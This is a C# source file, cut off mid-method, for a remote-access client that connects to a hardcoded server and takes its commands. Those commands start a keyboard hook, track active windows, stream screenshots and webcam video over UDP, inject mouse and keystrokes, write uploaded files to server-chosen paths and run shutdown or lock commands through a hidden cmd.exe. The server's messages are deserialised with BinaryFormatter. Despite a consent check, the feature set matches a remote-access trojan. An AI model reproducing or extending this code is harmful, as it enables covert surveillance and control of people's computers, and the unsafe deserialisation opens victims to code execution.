using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Threading;
using NAudio.Wave;
using RemoteClient.Camera;
using RemoteClient.Core;
using Encoder = System.Drawing.Imaging.Encoder;
using Timer = System.Threading.Timer;
using Newtonsoft.Json;
using JsonSerializer = System.Text.Json.JsonSerializer;

namespace RemoteClient
{
    internal static class NativeMethods
    {
        [DllImport("user32.dll")]
        internal static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        internal static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

        [DllImport("user32.dll")]
        internal static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        internal static extern bool SetProcessDPIAware(); // 👈 Thêm dòng này vào
    }

    public class RemoteClient
    {
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const string ServerIp = "192.168.54.38";
        private static NetworkStream ns;
        private static TcpClient server;
        private readonly bool distruct = false;
        private BinaryWriter bWrite;
        private Thread chatThread;
        private int depth = 70;
        private Dispatcher dispatcher;

        private FoundInfoSyncHandler FoundInfo;
        private bool isfile, arun;
        private bool isRemoteControlActive;

        private TreeNode node;

        private bool olReceived, shot = false;
        private Thread realTimeScreenShootThread;
        private Thread realTimeTrackerThread;
        private int remoteControlQuality = 100;
        private Timer remoteControlTimer;

        // Add these fields at the class level
        private bool remoteInteractionEnabled = true;
        private int screenShootUpdateTime = 100; //10 fps
        private readonly IPEndPoint serverEndPoint;
        private readonly IPEndPoint realTimeEndPoint;
        private ThreadEndedSyncHandler ThreadEnded;
        private ActiveWindowTracker tracker;

        private readonly UdpClient udpClient;
        private WaveInEvent waveIn;
        private Webcam webcam;
        
        private const int RC_UDP_PORT = 4444;
        private const int RTL_UDP_PORT = 8765;
        private const int STREAM_PORT = 3333;


        public RemoteClient()
        {
            udpClient = new UdpClient();
            serverEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), RC_UDP_PORT);
            realTimeEndPoint = new IPEndPoint(IPAddress.Parse(ServerIp), RTL_UDP_PORT);
            FoundInfo += this_FoundInfo;
            ThreadEnded += this_ThreadEnded;

            Searcher.FoundInfo += Searcher_FoundInfo;
            Searcher.ThreadEnded += Searcher_ThreadEnded;

            Application.ApplicationExit += agent_exit;

            dispatcher = Dispatcher.CurrentDispatcher;

            // Only start client if consent is given
            if (ConsentManager.ConsentGiven)
            {
                var t = new Thread(StartClient);
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }
        }

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, CopyPixelOperation rop);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);


// P/Invoke declarations
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
        
        private static T DeserializeData<T>(byte[] data) where T : class
        {
            try
            {
                var jsonString = System.Text.Encoding.UTF8.GetString(data);
                return JsonSerializer.Deserialize<T>(jsonString);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error deserializing data: {ex.Message}");
                return null;
            }
        }

        private void agent_exit(object sender, EventArgs e)
        {
            SendMessage(new DataObject
            {
                CommandType = "Self",
                CommandName = "result",
                CommandData = "Remote Client is terminated Reason can be any thing!"
            });
        }

        private void StartClient()
        {
            while (true)
            {
                if (!ConsentManager.ConsentGiven || distruct)
                    break;

                while (true)
                {
                    if (!ConsentManager.ConsentGiven || distruct)
                        break;

                    try
                    {
                        server = new TcpClient(GetIpAddress(), 9911);
                        break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                    //}
                    try
                    {
                        if (IsSocketConnected(server.Client)) break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                    Thread.Sleep(1000);
                }

                ns = server.GetStream();

                var state = new StateObject();
                state.workSocket = server.Client;
                server.Client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                    OnReceive, state);

                while (true)
                {
                    try
                    {
                        if (!IsSocketConnected(server.Client)) break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        break;
                    }

                    Thread.Sleep(1000);
                }

                StopRunningThreads();
                ns.Close();
                server.Close();
            }
        }

        private string GetIpAddress()
        {
            return ServerIp;
        }

        private void StopRunningThreads()
        {
            if (realTimeScreenShootThread != null) realTimeScreenShootThread.Abort();
            if (realTimeTrackerThread != null) realTimeTrackerThread.Abort();
        }

        private void Tracker()
        {
            tracker = new ActiveWindowTracker();
            arun = true;
            while (arun)
                try
                {
                    tracker.WriteCurrentWindowInformation();
                }
                catch (Exception ex)
                {
                    LogError(ex.ToString());
                }
        }

        private bool IsSocketConnected(Socket s)
        {
            var part1 = s.Poll(1000, SelectMode.SelectRead);
            var part2 = s.Available == 0;
            if ((part1 && part2) || !s.Connected)
                return false;
            return true;
        }

        private void Searcher_FoundInfo(FoundInfoEventArgs e)
        {
            this_FoundInfo(e);
        }

        private void this_FoundInfo(FoundInfoEventArgs e)
        {
            // Create a new item in the results list:
            SendMessage(new DataObject { CommandType = "SRCH", CommandName = "FF", CommandData = e.Info });
        }

        private void Searcher_ThreadEnded(ThreadEndedEventArgs e)
        {
            this_ThreadEnded(e);
        }

        private void this_ThreadEnded(ThreadEndedEventArgs e)
        {
            // Show an error message if necessary:
            if (!e.Success)
                SendMessage(new DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "EEND",
                    CommandData = e.ErrorMsg
                });
            else
                SendMessage(new DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "END",
                    CommandData = "Search Ended"
                });
        }

        [STAThread]
        private void OnReceive(IAsyncResult ar)
        {
            if (!ConsentManager.ConsentGiven)
                return;
            var content = string.Empty;
            var state = (StateObject)ar.AsyncState;
            var handler = state.workSocket;
            int bytesRead;

            if (handler.Connected)
                try
                {
                    bytesRead = handler.EndReceive(ar);
                    if (bytesRead > 0)
                    {
                        var bytesRemains = bytesRead;
                        var bytesProcess = 0;

                        while (bytesRemains > 0)
                            if (isfile)
                            {
                                if (state.fileSizeReceived < state.fileInfo.Length)
                                {
                                    byte[] buffer;
                                    long rl;
                                    if (bytesRemains > state.fileInfo.Length - state.fileSizeReceived)
                                        rl = state.fileInfo.Length - state.fileSizeReceived;
                                    else
                                        rl = bytesRemains;
                                    buffer = new byte[rl];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, buffer, 0, (int)rl);
                                        bWrite.Write(state.buffer, 0, (int)rl);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex);
                                    }

                                    bytesProcess += (int)rl;
                                    state.fileSizeReceived += (int)rl;
                                    bytesRemains = bytesRead - bytesProcess;

                                    if (state.fileSizeReceived == state.fileInfo.Length)
                                    {
                                        isfile = false;
                                        state.fileSizeReceived = 0;
                                        state.fileInfo = null;
                                        bWrite.Flush();
                                        bWrite.Close();
                                        bWrite.Dispose();
                                    }
                                }
                            }
                            else
                            {
                                if (!olReceived)
                                {
                                    var temp = new byte[4];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, 4);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex.Message, "Error");
                                    }

                                    state.ol = BitConverter.ToInt32(temp, 0);
                                    olReceived = true;
                                    bytesProcess += 4;
                                    bytesRemains = bytesRead - bytesProcess;
                                }
                                else
                                {
                                    if (state.bab.Length < state.ol)
                                    {
                                        byte[] temp;
                                        int rl;
                                        if (bytesRemains > state.ol - state.bab.Length)
                                            rl = state.ol - state.bab.Length;
                                        else
                                            rl = bytesRemains;

                                        temp = new byte[rl];
                                        try
                                        {
                                            Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, rl);
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine(ex.Message, "Error");
                                        }

                                        state.bab.Append(temp);
                                        bytesProcess += rl;
                                        bytesRemains = bytesRead - bytesProcess;
                                        if (state.bab.Length == state.ol)
                                            try
                                            {
                                                var d = (DataObject)ByteArrayToObject(state.bab.ToArray());

                                                olReceived = false;
                                                state.bab.Clear();

                                                if (d.CommandType == "FILE")
                                                {
                                                    isfile = true;
                                                    state.fileInfo = (FileInfo)((object[])d.CommandData)[1];
                                                    bWrite =
                                                        new BinaryWriter(File.Open(
                                                            ((object[])d.CommandData)[0] + "\\" + state.fileInfo.Name,
                                                            FileMode.Append));
                                                }
                                                else
                                                {
                                                    ProcessCommand(d);
                                                }
                                            }
                                            catch (Exception ex)
                                            {
                                                LogError(ex.Message);
                                            }
                                    }
                                }
                            }

                        handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                            OnReceive, state);
                    }
                }

                catch (SocketException socketException)
                {
                    //WSAECONNRESET, the other side closed impolitely
                    if (socketException.ErrorCode == 10054 ||
                        (socketException.ErrorCode != 10004 && socketException.ErrorCode != 10053))
                    {
                        // Complete the disconnect request.
                        handler.Close();
                        handler = null;
                    }
                }
                catch (Exception exception)
                {
                    Console.WriteLine(exception.ToString());
                    handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                        OnReceive, state);
                }
        }

        private void ProcessCommand(object ob)
        {
            if (!ConsentManager.ConsentGiven)
                return;
            var o = (DataObject)ob;

            if (o.CommandType == "RTL")
            {
                if (o.CommandName == "RTASTART")
                {
                    realTimeTrackerThread = new Thread(Tracker);
                    realTimeTrackerThread.Start();
                }
                else if (o.CommandName == "RTASTOP")
                {
                    arun = false;
                }
                else if (o.CommandName == "RTKLSTART")
                {
                    try
                    {
                        Program.InitHook();
                    }
                    catch (Exception ex)
                    {
                        LogError(ex.Message);
                    }
                }
                else if (o.CommandName == "RTKLSTOP")
                {
                    Program.Unhook();
                }
            }
         else if (o.CommandType == "ProcessScreenshot")
         {
             if (o.CommandName == "Capture")
             try
             {
                 NativeMethods.SetProcessDPIAware();
         
                 string processId = o.CommandData is object[] dataArray
                     ? dataArray[0].ToString()
                     : o.CommandData.ToString();
         
                 Debug.WriteLine($"Taking screenshot for process: {processId}");
         
                 // Get physical resolution
                 IntPtr desktop = NativeMethods.GetDC(IntPtr.Zero);
                 int physicalWidth = NativeMethods.GetDeviceCaps(desktop, 118);
                 int physicalHeight = NativeMethods.GetDeviceCaps(desktop, 117);
                 NativeMethods.ReleaseDC(IntPtr.Zero, desktop);
         
                 // Calculate scaled dimensions (75%)
                 int scaledWidth = (int)(physicalWidth * 0.75);
                 int scaledHeight = (int)(physicalHeight * 0.75);
         
                 Debug.WriteLine($"Physical screen resolution: {physicalWidth}x{physicalHeight}");
                 Debug.WriteLine($"Scaled resolution: {scaledWidth}x{scaledHeight}");
         
                 using (Bitmap fullBmp = new Bitmap(physicalWidth, physicalHeight))
                 using (Graphics g = Graphics.FromImage(fullBmp))
                 {
                     g.CopyFromScreen(0, 0, 0, 0, new Size(physicalWidth, physicalHeight));
         
                     // Create scaled bitmap
                     using (Bitmap scaledBmp = new Bitmap(scaledWidth, scaledHeight))
                     using (Graphics sg = Graphics.FromImage(scaledBmp))
                     {
                         sg.InterpolationMode = InterpolationMode.HighQualityBicubic;
                         sg.DrawImage(fullBmp, 0, 0, scaledWidth, scaledHeight);
         
                         byte[] imageBytes;
                         using (var ms = new MemoryStream())
                         {
                             var encoderParams = new EncoderParameters(1);
                             encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
                             var jpegCodec = GetEncoderInfo("image/jpeg");
                             scaledBmp.Save(ms, jpegCodec, encoderParams);
                             imageBytes = ms.ToArray();
                             Debug.WriteLine($"Compressed image size: {imageBytes.Length} bytes");
                         }
         
                         const int maxChunkSize = 30000;
                         var totalChunks = (imageBytes.Length + maxChunkSize - 1) / maxChunkSize;
                         Debug.WriteLine($"Splitting into {totalChunks} chunks");
         
                         var chunks = SplitIntoChunks(imageBytes, maxChunkSize)
                             .Select((chunk, index) => new
                             {
                                 ChunkData = chunk,
                                 TotalChunks = totalChunks,
                                 ChunkIndex = index + 1
                             });
         
                         foreach (var chunk in chunks)
                         {
                             var screenshotData = new ScreenshotData
                             {
                                 ProcessId = $"{processId}_{chunk.ChunkIndex}_{chunk.TotalChunks}",
                                 ImageBytes = chunk.ChunkData,
                                 ImageSize = new Size(scaledWidth, scaledHeight)
                             };
         
                             var jsonData = screenshotData.ToJson();
                             byte[] udpData = Encoding.UTF8.GetBytes(jsonData);
                             Debug.WriteLine($"Sending chunk {chunk.ChunkIndex}/{chunk.TotalChunks}");
                             udpClient.Send(udpData, udpData.Length, realTimeEndPoint);
         
                             // Small delay between chunks
                             Thread.Sleep(5);
                         }
                     }
                 }
             }
             catch (Exception ex)
             {
                 Debug.WriteLine($"Error capturing screenshot: {ex.Message}");
             }
         }
            else if (o.CommandType == "Webcam")
            {
                if (o.CommandName == "List")
                {
                    Debug.WriteLine("Webcam List requested");
                    try
                    {
                        if (webcam == null)
                        {
                            Debug.WriteLine("Creating new Webcam instance");
                            webcam = new Webcam();
                        }

                        var webcamList = webcam.Load();
                        Debug.WriteLine($"Found {webcamList.Count} webcams");
                        foreach (var device in webcamList)
                        {
                            Debug.WriteLine($"Webcam found: {device}");
                        }
                        if (webcamList.Count == 0)
                        {
                            Debug.WriteLine("No webcams found");
                            webcamList.Add("No webcam found");
                        }

                        SendMessage(new DataObject
                        {
                            CommandName = "List",
                            CommandType = "Webcam",
                            CommandData = webcamList.ToArray()
                        });
                        Debug.WriteLine("Webcam list sent to server");
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error getting webcam list: {ex.Message}");
                        SendMessage(new DataObject
                        {
                            CommandName = "List",
                            CommandType = "Webcam",
                            CommandData = new List<string>() { $"Error: {ex.Message}" }
                        });
                    }
                }
                else if (o.CommandName == "choose")
                {
                    if (webcam == null)
                        webcam = new Webcam();
                    webcam.setCamera((int)o.CommandData);
                    // SetCamera((int)o.CommandData);
                    // if (webcam != null)
                    //     webcam.InitializeUdpStream(ServerIp, STREAM_PORT);
                }
                else if (o.CommandName == "StartUDP")
                {
                    try
                    {
                        var data = (object[])o.CommandData;
                        int cameraIndex = (int)data[0];
                        int udpPort = (int)data[1];

                        if (webcam == null)
                            webcam = new Webcam();

                        webcam.setCamera(cameraIndex);
                        webcam.InitializeUdpStream(ServerIp, udpPort);
                        webcam.StartUdpStreaming();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error starting webcam UDP: {ex.Message}");
                    }
                }
                else if (o.CommandName == "Start")
                {
                    if (webcam != null)
                    {
                        // webcam.Start();
                        webcam.StartUdpStreaming();
                        // SendMessage();
                    }
                }
                else if (o.CommandName == "Stop")
                {
                    if (webcam != null) 
                        webcam.StopUdpStreaming();
                }
                else if (o.CommandName == "depth")
                {
                    if (webcam != null)
                        webcam.SetQuality((int)o.CommandData);
                }
            }
            else if (o.CommandType == "MessageBox")
            {
                if (o.CommandName == "show") ShowMessage(o.CommandData);
            }
            else if (o.CommandType == "CMD"){
                try
                {
                    switch (o.CommandName)
                    {
                        case "shutdown -s -f -t 10":
                            ExecuteCommand("shutdown -s -f -t 10");
                            break;
                        case "shutdown -r -f -t 10":
                            ExecuteCommand("shutdown -r -f -t 10");
                            break;
                        case "rundll32.exe user32.dll,LockWorkStation":
                            ExecuteCommand("rundll32.exe user32.dll,LockWorkStation");
                            break;
                        case "rundll32.exe powrprof.dll,SetSuspendState 0,1,0":
                            ExecuteCommand("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
                            break;
                        default:
                            Debug.WriteLine($"Unknown system command: {o.CommandName}");
                            break;
                    }
                }catch(Exception ex)
                {
                    Debug.WriteLine($"Error executing system command: {ex.Message}");
                }
                    
            }
            else if (o.CommandType == "Mouse")
            {
                MouseParser(o.CommandData, bool.Parse(o.CommandName));
            }
            else if (o.CommandType == "Keyboard")
            {
                if (o.CommandName == "send") issueKey(o.CommandData);
            }
            else if (o.CommandType == "RemoteControl")
            {
                switch (o.CommandName)
                {
                    case "Start":
                        // Start remote control session
                        var quality = 100; // Default quality
                        if (o.CommandData != null) int.TryParse(o.CommandData.ToString(), out quality);
                        StartRemoteControlSession(quality);
                        break;

                    case "Stop":
                        StopRemoteControlSession();
                        break;

                    case "GetScreen":
                        SendScreenToServer();
                        break;

                    case "Quality":
                        if (o.CommandData != null)
                        {
                            int.TryParse(o.CommandData.ToString(), out var newQuality);
                            remoteControlQuality = newQuality;
                        }
                        break;
                    case "GetClientInfo":
                        SendClientInfoToServer();
                        break;

                    case "MouseMove":
                        if (o.CommandData != null && remoteInteractionEnabled)
                        {
                            var coordinates = o.CommandData.ToString().Split(',');
                            if (coordinates.Length >= 2)
                            {
                                var x = int.Parse(coordinates[0]);
                                var y = int.Parse(coordinates[1]);
                                SimulateMouseMove(x, y);
                            }
                        }

                        break;

                    case "MouseClick":
                        if (o.CommandData != null && remoteInteractionEnabled)
                        {
                            var parts = o.CommandData.ToString().Split(',');
                            if (parts.Length >= 3)
                            {
                                var x = int.Parse(parts[0]);
                                var y = int.Parse(parts[1]);
                                var button = parts[2];
                                SimulateMouseClick(x, y, button);
                            }
                        }

                        break;

                    case "EnableInteraction":
                        remoteInteractionEnabled = true;
                        break;

                    case "DisableInteraction":
                        remoteInteractionEnabled = false;
                        break;
                }
            }
            else if (o.CommandType == "ProcessExit"){
                try
                {
                    // Ensure the command data is valid
                    if (o.CommandData == null)
                    {
                        Debug.WriteLine("Error: ProcessExit command received with null CommandData");
                        return;
                    }

                    var processId = o.CommandData.ToString();
                    var timeOut = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                    // Send message back to server to update the timeout
                    SendMessage(new DataObject
                    {
                        CommandType = "ProcessExit",
                        CommandName = "Update",
                        CommandData = new object[] { processId, timeOut }
                    });

                    Debug.WriteLine($"Process exit notification sent for PID: {processId}, TimeOut: {timeOut}");
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error handling ProcessExit command: {ex.Message}");

                    // Send error notification back to server
                    SendMessage(new DataObject
                    {
                        CommandType = "ProcessExit",
                        CommandName = "Error",
                        CommandData = $"Error: {ex.Message}"
                    });
                }
            }
        }
        private void ExecuteCommand(string command)
        {
            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C {command}",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                process.WaitForExit();
                Debug.WriteLine($"Command executed: {command}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error executing command: {ex.Message}");
            }
        }


        private void issueKey(object o)
        {
            try
            {
                SendKeys.Send((string)o);
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }


        private void ShowMessage(object p)
        {
            try
            {
                var data = (string[])p;
                var times = int.Parse(data[1]);

                var btns = MessageBoxButtons.OK;
                if (data[2] == "Error" || data[2] == "Confirmation")
                    btns = MessageBoxButtons.YesNo;

                var ico = MessageBoxIcon.Information;
                if (data[2] == "Warning")
                    ico = MessageBoxIcon.Warning;
                else if (data[2] == "Confirmation")
                    ico = MessageBoxIcon.Question;
                else if (data[2] == "Error")
                    ico = MessageBoxIcon.Error;

                for (var i = 1; i <= times; i++)
                {
                    var rs = MessageBox.Show(data[0], data[2], btns, ico, MessageBoxDefaultButton.Button1,
                        MessageBoxOptions.ServiceNotification);
                    SendMessage(new DataObject
                    {
                        CommandName = "Result",
                        CommandType = "MessageBox",
                        CommandData = rs.ToString()
                    });
                }
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }

        public static void LogError(string error)
        {
            error = DateTime.Now.ToShortTimeString() + " on " + DateTime.Today.ToShortDateString() +
                    Environment.NewLine + error;
            error = "Exception raised at " + error;

            SendMessage(new DataObject
            {
                CommandType = "LogBook",
                CommandData = error
            });
        }
        private Point Translate(Point point, Size from, Size to)
        {
            return new Point(point.X * to.Width / from.Width, point.Y * to.Height / from.Height);
        }
        private void MouseParser(object obj, bool click)
        {
            try
            {
                if (!click)
                {
                    var o = (object[])obj;
                    var p = Translate((Point)o[0], (Size)o[1],
                        new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                    Mouse.SetCursorPosition(p.X, p.Y);
                }
                else
                {
                    var tp = (string)obj;
                    if (tp == "rdown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightDown);
                    else if (tp == "rup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightUp);
                    else if (tp == "ldown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftDown);
                    else if (tp == "lup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftUp);
                }
            }
            catch (Exception e)
            {
                LogError(e.ToString());
            }
        }
        public static void SendMessage(object msg)
        {
            if (ConsentManager.ConsentGiven) ThreadPool.QueueUserWorkItem(SendNow, msg);
        }
        private static void SendNow(object msg)
        {
            var seek = 0;
            const int count = 102400;

            try
            {
                var handler = server.Client;

                var b = new ByteArrayBuilder();
                b.Append(ObjectToByteArray(msg));

                var ol = BitConverter.GetBytes(b.Length);

                handler.BeginSend(ol, 0, ol.Length, 0, SendCallBack, handler);

                //count = b.Length;
                var length = b.Length;

                while (length > count)
                {
                    handler.BeginSend(b.ToArray(seek, count), 0, count, 0, SendCallBack, handler);
                    //handler.BeginSend(buffer, 0, count, 0, new AsyncCallback(SendCallBack), handler);
                    seek += count;
                    length = length - count;
                }

                handler.BeginSend(b.ToArray(seek, length), 0, length, 0, SendCallBack, handler);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
        private static void SendCallBack(IAsyncResult ar)
        {
            try
            {
                var handler = (Socket)ar.AsyncState;
                var bytesSend = handler.EndSend(ar);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.Message, "Error");
            }
        }
        // private static byte[] ObjectToByteArray(object obj)
        // {
        //     try
        //     {
        //         if (obj == null)
        //             return null;
        //         var bf = new BinaryFormatter();
        //         bf.AssemblyFormat = FormatterAssemblyStyle.Simple;
        //         var ms = new MemoryStream();
        //         bf.Serialize(ms, obj);
        //         return ms.ToArray();
        //     }
        //     catch (Exception ex)
        //     {
        //         Debug.WriteLine(ex.Message, "Critical Error");
        //         return null;
        //     }
        // }
        private object ByteArrayToObject(byte[] arrBytes)
        {
            try
            {
                var memStream = new MemoryStream();
                var binForm = new BinaryFormatter();
                binForm.AssemblyFormat = FormatterAssemblyStyle.Simple;
                binForm.Binder = new DeserializationBinder();
                memStream.Write(arrBytes, 0, arrBytes.Length);
                memStream.Seek(0, SeekOrigin.Begin);
                var obj = binForm.Deserialize(memStream);
                return obj;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }
        
        private static IEnumerable<byte[]> SplitIntoChunks(byte[] data, int chunkSize)
        {
            for (int i = 0; i < data.Length; i += chunkSize)
            {
                int size = Math.Min(chunkSize, data.Length - i);
                var chunk = new byte[size];
                Buffer.BlockCopy(data, i, chunk, 0, size);
                yield return chunk;
            }
        }


        //=================remote control=========================
       
        private void StartRemoteControlSession(int quality)
        {
            try
            {
                remoteControlQuality = quality;
                isRemoteControlActive = true;
                SendScreenInfo();
                if (remoteControlTimer == null)
                    remoteControlTimer = new Timer(
                        _ => SendScreenToServer(), null, 0, 200); // 5 fps
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting remote control: {ex.Message}");
            }
        }

        private void StopRemoteControlSession()
        {
            try
            {
                isRemoteControlActive = false;

                if (remoteControlTimer != null)
                {
                    remoteControlTimer.Dispose();
                    remoteControlTimer = null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stopping remote control: {ex.Message}");
            }
        }
        private void SendClientInfoToServer()
        {
            try
            {
                var clientInfo = new
                {
                    dpiScale = GetDpiScale(),
                    screenWidth = Screen.PrimaryScreen.Bounds.Width,
                    screenHeight = Screen.PrimaryScreen.Bounds.Height
                };

                var jsonData = JsonConvert.SerializeObject(clientInfo);

                SendMessage(new DataObject
                {
                    CommandType = "RemoteControl",
                    CommandName = "ClientInfo",
                    CommandData = jsonData
                });

                Debug.WriteLine($"Sent client info - DPI Scale: {clientInfo.dpiScale:F2}, Screen: {clientInfo.screenWidth}x{clientInfo.screenHeight}");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending client info: {ex.Message}");
            }
        }
        private float GetDpiScale()
        {
            try
            {
                using (var graphics = Graphics.FromHwnd(IntPtr.Zero))
                {
                    return graphics.DpiX / 96.0f; // 96 DPI is the baseline
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error getting DPI scale: {ex.Message}");
                return 1.0f; // Default to 1.0 if there's an error
            }
        }

        private void SendScreenInfo()
        {
            try
            {
                var screenSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var data = ObjectToByteArray(screenSize);
                udpClient.Send(data, data.Length, serverEndPoint);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending screen info: {ex.Message}");
            }
        }

private void SendScreenToServer()
{
    if (!isRemoteControlActive) return;

    try
    {
        // Check if the server is reachable
        // if (!IsServerReachable(serverEndPoint.Address.ToString()))
        // {
        //     Debug.WriteLine("Server is not reachable. Stopping chunk transmission.");
        //     return;
        // }
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        float dpiX, dpiY;
        using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
        {
            dpiX = g.DpiX / 96f;
            dpiY = g.DpiY / 96f;
        }

        int actualWidth = (int)(bounds.Width * dpiX);
        int actualHeight = (int)(bounds.Height * dpiY);

        using (var screenshot = new Bitmap(actualWidth, actualHeight))
        {
            using (var g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, new Size(actualWidth, actualHeight));
            }

            using (var ms = new MemoryStream())
            {
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, remoteControlQuality);

                var jpegEncoder = GetEncoder(ImageFormat.Jpeg);
                screenshot.Save(ms, jpegEncoder, encoderParams);

                var imageBytes = ms.ToArray();
                const int maxChunkSize = 30000;
                var totalChunks = (imageBytes.Length + maxChunkSize - 1) / maxChunkSize;

                for (int i = 0; i < totalChunks; i++)
                {
                    int chunkSize = Math.Min(maxChunkSize, imageBytes.Length - i * maxChunkSize);
                    byte[] chunk = new byte[chunkSize];
                    Buffer.BlockCopy(imageBytes, i * maxChunkSize, chunk, 0, chunkSize);

                    var chunkData = new
                    {
                        ChunkIndex = i + 1,
                        TotalChunks = totalChunks,
                        Data = chunk
                    };

                    string jsonData = JsonSerializer.Serialize(chunkData);
                    Debug.WriteLine($"Sending chunk {i + 1}/{totalChunks}: {jsonData}");
                    byte[] udpData = Encoding.UTF8.GetBytes(jsonData);

                    udpClient.Send(udpData, udpData.Length, serverEndPoint);
                    Thread.Sleep(5);
                }
            }
        }
    }
    catch (Exception ex)
    {
        Debug.WriteLine($"Error sending screen: {ex.Message}");
    }
}

private bool IsServerReachable(string serverIp)
{
    try
    {
        using (var ping = new System.Net.NetworkInformation.Ping())
        {
            var reply = ping.Send(serverIp, 1000); // 1-second timeout
            return reply != null && reply.Status == System.Net.NetworkInformation.IPStatus.Success;
        }
    }
    catch (Exception ex)
    {
        Debug.WriteLine($"Error checking server reachability: {ex.Message}");
        return false;
    }
}

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();

            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;

            return null;
        }

        private static byte[] ObjectToByteArray(object obj)
        {
            try
            {
                if (obj == null)
                    return null;
                var bf = new BinaryFormatter();
                using (var ms = new MemoryStream())
                {
                    bf.Serialize(ms, obj);
                    return ms.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error serializing object: {ex.Message}");
                return null;
            }
        }

        private void SimulateMouseMove(int x, int y)
        {
            if (!remoteInteractionEnabled) return;

            try
            {
                SetCursorPos(x, y);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error simulating mouse move: {ex.Message}");
            }
        }

        private void SimulateMouseClick(int x, int y, string buttonName)
        {
            if (!remoteInteractionEnabled) return;

            try
            {
                // Move cursor to position first
                SetCursorPos(x, y);

                if (buttonName.Contains("Left"))
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                }
                else if (buttonName.Contains("Right"))
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                }
            }
